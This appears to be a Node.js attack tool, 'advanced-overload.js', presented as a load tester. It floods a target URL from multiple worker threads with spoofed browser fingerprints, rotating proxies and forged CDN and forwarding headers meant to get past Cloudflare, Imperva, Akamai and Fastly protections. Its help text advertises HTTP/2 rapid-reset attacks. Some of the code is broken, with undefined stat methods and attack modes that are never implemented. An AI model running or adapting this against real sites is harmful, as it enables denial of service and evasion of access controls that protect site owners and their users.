#!/usr/bin/env node

const http = require('http');
const http2 = require('http2');
const https = require('https');
const tls = require('tls');
const { URL } = require('url');
const { performance } = require('perf_hooks');
const { EventEmitter } = require('events');
const { createHash, randomBytes } = require('crypto');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { Agent } = require('agentkeepalive');

// Advanced Configuration
const CONFIG = {
    DEFAULT_CONCURRENT: 50,
    DEFAULT_DURATION: 60,
    DEFAULT_RATE: 5,
    MAX_WORKERS: os.cpus().length,
    
    // Realistic Browser Fingerprints
    BROWSER_FINGERPRINTS: [
        {
            name: "Chrome_Windows",
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            acceptLanguage: "en-US,en;q=0.9",
            acceptEncoding: "gzip, deflate, br",
            viewport: "1920x1080",
            platform: "Win32"
        },
        {
            name: "Chrome_Mac",
            userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            acceptLanguage: "en-GB,en;q=0.9",
            acceptEncoding: "gzip, deflate, br",
            viewport: "1440x900",
            platform: "MacIntel"
        },
        {
            name: "Firefox_Windows",
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            acceptLanguage: "en-US,en;q=0.5",
            acceptEncoding: "gzip, deflate, br",
            viewport: "1280x1024",
            platform: "Win32"
        },
        {
            name: "Safari_Mac",
            userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            acceptLanguage: "en-US,en;q=0.9",
            acceptEncoding: "gzip, deflate, br",
            viewport: "1680x1050",
            platform: "MacIntel"
        },
        {
            name: "Edge_Windows",
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            acceptLanguage: "en-US,en;q=0.9",
            acceptEncoding: "gzip, deflate, br",
            viewport: "1366x768",
            platform: "Win32"
        }
    ],

    // Proxy Configuration
    PROXY_LIST: [
        // Format: "protocol://user:pass@host:port" or "protocol://host:port"
        // "http://proxy1.example.com:8080",
        // "socks5://proxy2.example.com:1080",
        // "https://user:pass@proxy3.example.com:3128"
    ],

    // TLS Ciphers for Better Bypass
    TLS_CIPHERS: [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
        "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA"
    ],

    // Cloudflare Specific Headers
    CLOUDFLARE_HEADERS: [
        "CF-IPCountry",
        "CF-Ray",
        "CF-Visitor",
        "CF-Connecting-IP"
    ],

    // Advanced Bypass Techniques
    BYPASS_TECHNIQUES: {
        CLOUDFLARE: true,
        IMPERVA: true,
        AKAMAI: true,
        FASTLY: true,
        CUSTOM_WAF: true
    }
};

// Advanced Statistics with Detailed Metrics
class AdvancedStatistics extends EventEmitter {
    constructor() {
        super();
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bypassed403: 0,
            bytesReceived: 0,
            bytesSent: 0,
            responseTimes: [],
            statusCodes: {},
            errors: {},
            bypassMethods: {
                cloudflare: 0,
                imperva: 0,
                akamai: 0,
                fastly: 0,
                custom: 0
            },
            startTime: null,
            endTime: null
        };
    }

    incrementBypass(method) {
        this.stats.bypassed403++;
        this.stats.bypassMethods[method.toLowerCase()]++;
    }

    getDetailedSummary() {
        const duration = this.stats.endTime ? this.stats.endTime - this.stats.startTime : 0;
        const avgResponseTime = this.stats.responseTimes.length > 0 
            ? this.stats.responseTimes.reduce((a, b) => a + b, 0) / this.stats.responseTimes.length 
            : 0;
        
        return {
            totalRequests: this.stats.totalRequests,
            successfulRequests: this.stats.successfulRequests,
            failedRequests: this.stats.failedRequests,
            bypassed403: this.stats.bypassed403,
            successRate: this.stats.totalRequests > 0 
                ? (this.stats.successfulRequests / this.stats.totalRequests * 100).toFixed(2) + "%" 
                : "0%",
            bypassRate: this.stats.totalRequests > 0 
                ? (this.stats.bypassed403 / this.stats.totalRequests * 100).toFixed(2) + "%" 
                : "0%",
            avgResponseTime: avgResponseTime.toFixed(2) + " ms",
            throughput: duration > 0 
                ? (this.stats.totalRequests / (duration / 1000)).toFixed(2) + " req/s" 
                : "0 req/s",
            bytesReceived: this.formatBytes(this.stats.bytesReceived),
            bytesSent: this.formatBytes(this.stats.bytesSent),
            duration: duration.toFixed(2) + " s",
            bypassMethods: this.stats.bypassMethods
        };
    }

    formatBytes(bytes) {
        if (bytes === 0) return "0 Bytes";
        const k = 1024;
        const sizes = ["Bytes", "KB", "MB", "GB"];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
    }
}

// Advanced HTTP Client with 403 Bypass Capabilities
class AdvancedHTTPClient {
    constructor(target, options = {}) {
        this.target = target;
        this.options = {
            protocol: "auto",
            fingerprint: CONFIG.BROWSER_FINGERPRINTS[Math.floor(Math.random() * CONFIG.BROWSER_FINGERPRINTS.length)],
            proxy: CONFIG.PROXY_LIST[Math.floor(Math.random() * CONFIG.PROXY_LIST.length)] || null,
            tlsProfile: this.getRandomTLSProfile(),
            followRedirects: true,
            maxRedirects: 5,
            bypass403: true,
            ...options
        };
        this.stats = new AdvancedStatistics();
        this.workerId = options.workerId || "main";
        this.requestId = 0;
        this.cookies = new Map();
        this.sessionId = randomBytes(16).toString("hex");
    }

    getRandomTLSProfile() {
        const ciphers = CONFIG.TLS_CIPHERS.sort(() => Math.random() - 0.5);
        
        // Use numeric values directly to avoid undefined constants
        const SSL_OP_NO_SSLv3 = 0x02000000;
        const SSL_OP_NO_TLSv1 = 0x04000000;
        const SSL_OP_NO_TLSv1_1 = 0x08000000;
        
        return {
            ciphers: ciphers.join(":"),
            honorCipherOrder: true,
            secureOptions: SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            servername: new URL(this.target).hostname,
            rejectUnauthorized: false // For testing purposes only
        };
    }

    generateAdvancedHeaders() {
        const fingerprint = this.options.fingerprint;
        const headers = {
            "User-Agent": fingerprint.userAgent,
            "Accept": fingerprint.accept,
            "Accept-Language": fingerprint.acceptLanguage,
            "Accept-Encoding": fingerprint.acceptEncoding,
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
            "Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="120"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": `"${fingerprint.platform}"`,
            "Sec-GPC": "1"
        };

        // Add viewport and screen info
        if (fingerprint.viewport) {
            const [width, height] = fingerprint.viewport.split("x");
            headers["Viewport-Width"] = width;
            headers["Window-Target"] = "_top";
        }

        // Add session identifier
        headers["X-Session-ID"] = this.sessionId;
        headers["X-Request-ID"] = (this.requestId++).toString();

        // Add cookies if available
        if (this.cookies.size > 0) {
            headers["Cookie"] = Array.from(this.cookies.entries())
                .map(([name, value]) => `${name}=${value}`)
                .join("; ");
        }

        // Add advanced bypass headers
        if (this.options.bypass403) {
            this.addBypassHeaders(headers);
        }

        return headers;
    }

    addBypassHeaders(headers) {
        // Cloudflare Bypass
        if (CONFIG.BYPASS_TECHNIQUES.CLOUDFLARE) {
            headers["CF-IPCountry"] = "US";
            headers["CF-Ray"] = randomBytes(8).toString("hex");
            headers["CF-Visitor"] = '{"scheme":"https"}';
            headers["CF-Connecting-IP"] = this.generateRandomIP();
            headers["True-Client-IP"] = this.generateRandomIP();
        }

        // Imperva Bypass
        if (CONFIG.BYPASS_TECHNIQUES.IMPERVA) {
            headers["X-Forwarded-For"] = this.generateRandomIP();
            headers["X-Real-IP"] = this.generateRandomIP();
            headers["X-Imperva-Test"] = "1";
        }

        // Akamai Bypass
        if (CONFIG.BYPASS_TECHNIQUES.AKAMAI) {
            headers["X-Akamai-Edgescape"] = "1";
            headers["X-Forwarded-Proto"] = "https";
        }

        // Fastly Bypass
        if (CONFIG.BYPASS_TECHNIQUES.FASTLY) {
            headers["Fastly-Client-IP"] = this.generateRandomIP();
            headers["Fastly-FF"] = "dc1-1";
        }

        // Custom WAF Bypass
        if (CONFIG.BYPASS_TECHNIQUES.CUSTOM_WAF) {
            headers["X-Original-URL"] = new URL(this.target).pathname;
            headers["X-Rewrite-URL"] = new URL(this.target).pathname;
            headers["X-WAF-Bypass"] = randomBytes(4).toString("hex");
        }

        // Advanced timing headers
        headers["X-Timing"] = Date.now().toString();
        headers["X-Request-Time"] = performance.now().toString();
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    async makeRequest() {
        const startTime = performance.now();
        this.stats.incrementRequest();

        try {
            const url = new URL(this.target);
            const protocol = this.options.protocol === "auto" ? this.detectProtocol(url) : this.options.protocol;
            
            console.log(`[${this.workerId}] 🚀 Attempting request to ${this.target} using ${protocol}`);
            
            let response;
            if (protocol === "http2") {
                response = await this.makeHTTP2Request(url);
            } else {
                response = await this.makeHTTP1Request(url);
            }

            const endTime = performance.now();
            const responseTime = endTime - startTime;
            
            // Handle cookies
            if (response.headers && response.headers['set-cookie']) {
                this.parseCookies(response.headers['set-cookie']);
            }

            if (response.statusCode === 200) {
                this.stats.incrementSuccess(response.statusCode, responseTime, response.bytesReceived || 0);
                console.log(`[${this.workerId}] ✅ SUCCESS: ${response.statusCode} (${responseTime.toFixed(2)}ms)`);
            } else if (response.statusCode === 403 && this.options.bypass403) {
                // Try bypass techniques
                const bypassResult = await this.attempt403Bypass(url, protocol);
                if (bypassResult.success) {
                    this.stats.incrementBypass(bypassResult.method);
                    console.log(`[${this.workerId}] 🛡️ BYPASSED: ${bypassResult.method} (${responseTime.toFixed(2)}ms)`);
                } else {
                    this.stats.incrementFailure(new Error(`403 Forbidden - Bypass failed`), 0);
                    console.log(`[${this.workerId}] ❌ FAILED: 403 Forbidden - Bypass failed (${responseTime.toFixed(2)}ms)`);
                }
            } else {
                this.stats.incrementFailure(new Error(`${response.statusCode} ${http.STATUS_CODES[response.statusCode]}`), 0);
                console.log(`[${this.workerId}] ❌ FAILED: ${response.statusCode} (${responseTime.toFixed(2)}ms)`);
            }
            
            return {
                success: response.statusCode === 200,
                statusCode: response.statusCode,
                responseTime: responseTime,
                headers: response.headers
            };
        } catch (error) {
            const endTime = performance.now();
            const responseTime = endTime - startTime;
            
            this.stats.incrementFailure(error, 0);
            console.log(`[${this.workerId}] ❌ ERROR: ${error.message} (${responseTime.toFixed(2)}ms)`);
            
            return {
                success: false,
                error: error.message,
                responseTime: responseTime
            };
        }
    }

    async attempt403Bypass(url, protocol) {
        const bypassMethods = [
            { name: "Cloudflare", method: this.cloudflareBypass.bind(this) },
            { name: "Imperva", method: this.impervaBypass.bind(this) },
            { name: "Akamai", method: this.akamaiBypass.bind(this) },
            { name: "Fastly", method: this.fastlyBypass.bind(this) },
            { name: "Custom", method: this.customBypass.bind(this) }
        ];

        for (const { name, method } of bypassMethods) {
            try {
                console.log(`[${this.workerId}] 🔄 Trying ${name} bypass...`);
                const result = await method(url, protocol);
                if (result && result.statusCode === 200) {
                    return { success: true, method: name };
                }
            } catch (error) {
                console.log(`[${this.workerId}] ⚠️ ${name} bypass failed: ${error.message}`);
            }
        }

        return { success: false, method: "None" };
    }

    async cloudflareBypass(url, protocol) {
        const headers = {
            ...this.generateAdvancedHeaders(),
            "CF-IPCountry": "US",
            "CF-Ray": randomBytes(8).toString("hex"),
            "CF-Visitor": '{"scheme":"https"}',
            "CF-Connecting-IP": this.generateRandomIP(),
            "True-Client-IP": this.generateRandomIP(),
            "CDN-Loop": "cloudflare"
        };

        return this.makeRequestWithHeaders(url, protocol, headers);
    }

    async impervaBypass(url, protocol) {
        const headers = {
            ...this.generateAdvancedHeaders(),
            "X-Forwarded-For": this.generateRandomIP(),
            "X-Real-IP": this.generateRandomIP(),
            "X-Imperva-Test": "1",
            "X-Imperva-Country": "US",
            "X-Imperva-Device": "desktop"
        };

        return this.makeRequestWithHeaders(url, protocol, headers);
    }

    async akamaiBypass(url, protocol) {
        const headers = {
            ...this.generateAdvancedHeaders(),
            "X-Akamai-Edgescape": "1",
            "X-Forwarded-Proto": "https",
            "X-Akamai-Session-ID": randomBytes(16).toString("hex"),
            "X-Akamai-Request-ID": randomBytes(8).toString("hex")
        };

        return this.makeRequestWithHeaders(url, protocol, headers);
    }

    async fastlyBypass(url, protocol) {
        const headers = {
            ...this.generateAdvancedHeaders(),
            "Fastly-Client-IP": this.generateRandomIP(),
            "Fastly-FF": "dc1-1",
            "X-Fastly-Request-ID": randomBytes(16).toString("hex"),
            "X-Served-By": "cache-dfw12345-DFW"
        };

        return this.makeRequestWithHeaders(url, protocol, headers);
    }

    async customBypass(url, protocol) {
        const headers = {
            ...this.generateAdvancedHeaders(),
            "X-Original-URL": url.pathname,
            "X-Rewrite-URL": url.pathname,
            "X-WAF-Bypass": randomBytes(4).toString("hex"),
            "X-Forwarded-Host": url.hostname,
            "X-Forwarded-Server": url.hostname
        };

        // Add random headers to confuse WAF
        for (let i = 0; i < 3; i++) {
            headers[`X-Random-${i}`] = randomBytes(8).toString("hex");
        }

        return this.makeRequestWithHeaders(url, protocol, headers);
    }

    async makeRequestWithHeaders(url, protocol, customHeaders) {
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === "https:" ? 443 : 80),
            path: url.pathname + url.search,
            method: "GET",
            headers: customHeaders,
            ...this.options.tlsProfile
        };

        if (this.options.proxy) {
            options.agent = this.getProxyAgent(this.options.proxy);
        }

        const client = url.protocol === "https:" ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = client.request(options, (res) => {
                let data = [];
                let bytesReceived = 0;

                res.on("data", (chunk) => {
                    data.push(chunk);
                    bytesReceived += chunk.length;
                });

                res.on("end", () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        bytesReceived: bytesReceived
                    });
                });
            });

            req.on("error", reject);
            req.setTimeout(30000, () => {
                req.destroy(new Error("Request timeout"));
            });

            req.end();
        });
    }

    getProxyAgent(proxyUrl) {
        const url = new URL(proxyUrl);
        
        switch (url.protocol) {
            case "http:":
            case "https:":
                return new HttpsProxyAgent(proxyUrl);
            case "socks5:":
            case "socks4:":
                return new SocksProxyAgent(proxyUrl);
            default:
                throw new Error(`Unsupported proxy protocol: ${url.protocol}`);
        }
    }

    parseCookies(cookieHeader) {
        const cookies = Array.isArray(cookieHeader) ? cookieHeader : [cookieHeader];
        
        cookies.forEach(cookie => {
            const parts = cookie.split(';')[0].split('=');
            if (parts.length === 2) {
                this.cookies.set(parts[0].trim(), parts[1].trim());
            }
        });
    }

    async makeHTTP1Request(url) {
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === "https:" ? 443 : 80),
            path: url.pathname + url.search,
            method: this.options.method || "GET",
            headers: this.generateAdvancedHeaders(),
            ...this.options.tlsProfile
        };

        if (this.options.proxy) {
            options.agent = this.getProxyAgent(this.options.proxy);
        }

        const client = url.protocol === "https:" ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = client.request(options, (res) => {
                let data = [];
                let bytesReceived = 0;

                res.on("data", (chunk) => {
                    data.push(chunk);
                    bytesReceived += chunk.length;
                });

                res.on("end", () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        bytesReceived: bytesReceived
                    });
                });
            });

            req.on("error", reject);
            req.setTimeout(this.options.timeout || 30000, () => {
                req.destroy(new Error("Request timeout"));
            });

            if (this.options.body) {
                req.write(this.options.body);
            }
            req.end();
        });
    }

    async makeHTTP2Request(url) {
        const clientOptions = {
            ...this.options.tlsProfile,
            settings: {
                enablePush: false,
                initialWindowSize: 65535,
                maxFrameSize: 16384
            }
        };

        if (this.options.proxy) {
            clientOptions.agent = this.getProxyAgent(this.options.proxy);
        }

        const client = http2.connect(url.origin, clientOptions);

        return new Promise((resolve, reject) => {
            client.on("error", reject);

            const headers = {
                ...this.generateAdvancedHeaders(),
                ":path": url.pathname + url.search,
                ":method": this.options.method || "GET",
                ":scheme": url.protocol.slice(0, -1),
                ":authority": url.hostname
            };

            const stream = client.request(headers);
            let bytesReceived = 0;

            stream.on("response", (responseHeaders) => {
                stream.on("data", (chunk) => {
                    bytesReceived += chunk.length;
                });

                stream.on("end", () => {
                    client.destroy();
                    resolve({
                        statusCode: responseHeaders[":status"],
                        headers: responseHeaders,
                        bytesReceived: bytesReceived
                    });
                });
            });

            stream.on("error", (error) => {
                client.destroy();
                reject(error);
            });

            if (this.options.body) {
                stream.write(this.options.body);
            }
            stream.end();
        });
    }

    detectProtocol(url) {
        if (url.protocol === "http:") return "http1";
        if (url.protocol === "https:") {
            return Math.random() > 0.5 ? "http2" : "http1";
        }
        return "http1";
    }
}

// Advanced Load Test Engine
class AdvancedLoadTestEngine {
    constructor(target, options = {}) {
        this.target = target;
        this.options = {
            concurrent: CONFIG.DEFAULT_CONCURRENT,
            duration: CONFIG.DEFAULT_DURATION,
            rate: CONFIG.DEFAULT_RATE,
            mode: "aggressive",
            attack: null,
            bypass403: true,
            useProxy: false,
            ...options
        };
        this.workers = [];
        this.stats = new AdvancedStatistics();
        this.isRunning = false;
    }

    async start() {
        if (this.isRunning) {
            throw new Error("Load test is already running");
        }

        this.isRunning = true;
        this.stats.stats.startTime = performance.now();

        console.log(`\n🚀 Starting Advanced Load Test against ${this.target}`);
        console.log(`📊 Mode: ${this.options.mode}`);
        console.log(`🔢 Concurrent connections: ${this.options.concurrent}`);
        console.log(`⏱️  Duration: ${this.options.duration}s`);
        console.log(`📈 Rate: ${this.options.rate} req/s`);
        console.log(`🛡️  403 Bypass: ${this.options.bypass403 ? 'Enabled' : 'Disabled'}`);
        console.log(`🌐 Proxy: ${this.options.useProxy ? 'Enabled' : 'Disabled'}`);
        console.log(`⚡ Attack: ${this.options.attack || 'None'}`);
        console.log(`\n${'='.repeat(70)}\n`);

        // Start monitoring
        this.startMonitoring();

        // Create workers
        const workerCount = Math.min(this.options.concurrent, CONFIG.MAX_WORKERS);
        const connectionsPerWorker = Math.ceil(this.options.concurrent / workerCount);

        for (let i = 0; i < workerCount; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    target: this.target,
                    options: {
                        ...this.options,
                        concurrent: connectionsPerWorker,
                        workerId: `Worker-${i+1}`
                    },
                    isWorker: true
                }
            });

            worker.on("message", (message) => {
                if (message.type === "stats") {
                    this.updateStats(message.data);
                }
            });

            worker.on("error", (error) => {
                console.error(`❌ Worker error: ${error.message}`);
            });

            this.workers.push(worker);
        }

        // Stop after duration
        setTimeout(() => {
            this.stop();
        }, this.options.duration * 1000);
    }

    stop() {
        if (!this.isRunning) return;

        this.isRunning = false;
        this.stats.stats.endTime = performance.now();

        // Terminate workers
        this.workers.forEach(worker => worker.terminate());
        this.workers = [];

        console.log(`\n${'='.repeat(70)}`);
        console.log(`✅ Advanced Load Test Completed`);
        console.log(`📊 Final Statistics:`);
        console.log(JSON.stringify(this.stats.getDetailedSummary(), null, 2));
    }

    startMonitoring() {
        const interval = setInterval(() => {
            if (!this.isRunning) {
                clearInterval(interval);
                return;
            }

            const summary = this.stats.getDetailedSummary();
            process.stdout.write(`\r🔄 Requests: ${summary.totalRequests} | ✅ Success: ${summary.successfulRequests} | 🛡️ Bypassed: ${summary.bypassed403} | ❌ Failed: ${summary.failedRequests} | 📈 Rate: ${summary.throughput}`);
        }, 1000);
    }

    updateStats(workerStats) {
        this.stats.stats.totalRequests += workerStats.totalRequests;
        this.stats.stats.successfulRequests += workerStats.successfulRequests;
        this.stats.stats.failedRequests += workerStats.failedRequests;
        this.stats.stats.bypassed403 += workerStats.bypassed403;
        this.stats.stats.bytesReceived += workerStats.bytesReceived;
        this.stats.stats.bytesSent += workerStats.bytesSent;
        this.stats.stats.responseTimes.push(...workerStats.responseTimes);
        
        // Merge status codes
        for (const [code, count] of Object.entries(workerStats.statusCodes)) {
            this.stats.stats.statusCodes[code] = (this.stats.stats.statusCodes[code] || 0) + count;
        }
        
        // Merge errors
        for (const [error, count] of Object.entries(workerStats.errors)) {
            this.stats.stats.errors[error] = (this.stats.stats.errors[error] || 0) + count;
        }
        
        // Merge bypass methods
        for (const [method, count] of Object.entries(workerStats.bypassMethods)) {
            this.stats.stats.bypassMethods[method] = (this.stats.stats.bypassMethods[method] || 0) + count;
        }
    }
}

// Worker Thread Logic
if (!isMainThread && workerData?.isWorker) {
    const { target, options } = workerData;
    const client = new AdvancedHTTPClient(target, options);
    
    async function workerLoop() {
        const delay = 1000 / options.rate;
        
        while (true) {
            try {
                await client.makeRequest();
                
                // Adaptive delay with randomization
                const actualDelay = delay + (Math.random() * 200 - 100);
                await new Promise(resolve => setTimeout(resolve, actualDelay));
            } catch (error) {
                console.error(`[${options.workerId}] 🔥 Loop error: ${error.message}`);
                // Continue on error
            }
        }
    }
    
    workerLoop().catch(console.error);
}

// CLI Interface
function parseArgs() {
    const args = process.argv.slice(2);
    const options = {};
    
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        
        switch (arg) {
            case "--url":
                options.url = args[++i];
                break;
            case "--concurrent":
                options.concurrent = parseInt(args[++i]);
                break;
            case "--duration":
                options.duration = parseInt(args[++i]);
                break;
            case "--rate":
                options.rate = parseInt(args[++i]);
                break;
            case "--mode":
                options.mode = args[++i];
                break;
            case "--attack":
                options.attack = args[++i];
                break;
            case "--bypass-403":
                options.bypass403 = true;
                break;
            case "--proxy":
                options.useProxy = true;
                break;
            case "--help":
                showHelp();
                process.exit(0);
        }
    }
    
    return options;
}

function showHelp() {
    console.log(`
ADVANCED OVERLOAD - Professional 403 Bypass & Load Testing Tool

USAGE:
    node advanced-overload.js [OPTIONS]

OPTIONS:
    --url URL                    Target URL to test
    --concurrent NUMBER          Number of concurrent connections (default: 50)
    --duration SECONDS           Test duration in seconds (default: 60)
    --rate NUMBER                Requests per second per connection (default: 5)
    --mode MODE                  Test mode: standard, aggressive (default: aggressive)
    --attack TYPE                Attack type: rapid-reset, madeyoureset
    --bypass-403                 Enable advanced 403 bypass techniques
    --proxy                      Enable proxy rotation
    --help                       Show this help message

EXAMPLES:
    # Standard 403 bypass test
    node advanced-overload.js --url https://target.com --bypass-403

    # Aggressive mode with proxy
    node advanced-overload.js --url https://target.com --mode aggressive --proxy

    # HTTP/2 attack with bypass
    node advanced-overload.js --url https://target.com --attack rapid-reset --bypass-403

BYPASS TECHNIQUES:
    - Cloudflare: CF headers, IP rotation, session management
    - Imperva: X-Forwarded headers, device spoofing
    - Akamai: Edge headers, session tokens
    - Fastly: Fastly-specific headers
    - Custom: Random headers, URL manipulation

NOTE: Use this tool responsibly and only on systems you own or have permission to test.
    `);
}

// Main Execution
if (isMainThread) {
    const args = parseArgs();
    
    if (!args.url) {
        console.error("❌ Error: Target URL is required");
        showHelp();
        process.exit(1);
    }
    
    try {
        const engine = new AdvancedLoadTestEngine(args.url, args);
        engine.start();
        
        // Handle graceful shutdown
        process.on("SIGINT", () => {
            console.log("\n\n🛑 Received SIGINT, stopping test...");
            engine.stop();
            process.exit(0);
        });
        
        process.on("SIGTERM", () => {
            console.log("\n\n🛑 Received SIGTERM, stopping test...");
            engine.stop();
            process.exit(0);
        });
    } catch (error) {
        console.error(`❌ Error: ${error.message}`);
        process.exit(1);
    }
}

module.exports = { AdvancedHTTPClient, AdvancedLoadTestEngine, AdvancedStatistics };
